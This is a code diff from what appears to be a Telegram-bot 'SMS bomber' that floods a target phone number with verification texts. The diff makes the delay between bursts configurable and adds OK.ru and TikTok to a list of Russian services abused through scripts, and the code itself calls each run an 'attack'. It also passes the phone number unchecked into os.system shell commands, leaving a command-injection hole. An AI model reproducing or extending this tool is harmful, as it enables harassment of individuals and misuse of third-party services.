@@ -20,49 +20,59 @@ def run_sms(phone, userid):
 
         os.system("python3 services/uber.py " + phone[1:-1])
 
-        time.sleep(2)
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         os.system("python3 services/aptekaapril.py " + phone)
 
-        time.sleep(2)
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         os.system("python3 services/citymobil.py " + phone)
 
-        time.sleep(2)
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         os.system("python3 services/kari.py " + phone)
 
-        time.sleep(2)
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         os.system("python3 services/mvideo.py " + phone)
 
-        time.sleep(2)
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         os.system("python3 services/perekrestok.py " + phone)
 
-        time.sleep(2)
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         os.system("python3 services/sravni.py " + phone)
 
-        time.sleep(2)
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         os.system("python3 services/citilink.py " + phone)
 
-        time.sleep(2)
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         os.system("python3 services/icq.py " + phone)
 
-        time.sleep(2)
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         os.system("python3 services/yandexfood.py " + phone)
 
-        time.sleep(2)
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         os.system("python3 services/sdravcity.py " + phone[1:-1])
 
-        time.sleep(2)
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         os.system("python3 services/vkusvill.py " + phone)
+
+        time.sleep(int(utilities.get_sms_timesleep()))
+
+        os.system("python3 services/okru.py " + phone)
+
+        time.sleep(int(utilities.get_sms_timesleep()))
+
+        os.system("python3 services/tiktok.py " + phone[1:-1])
+
+        time.sleep(int(utilities.get_sms_timesleep()))
 
         if not utilities.is_attack_running(userid):
             bot = telebot.TeleBot(config.bot_token)
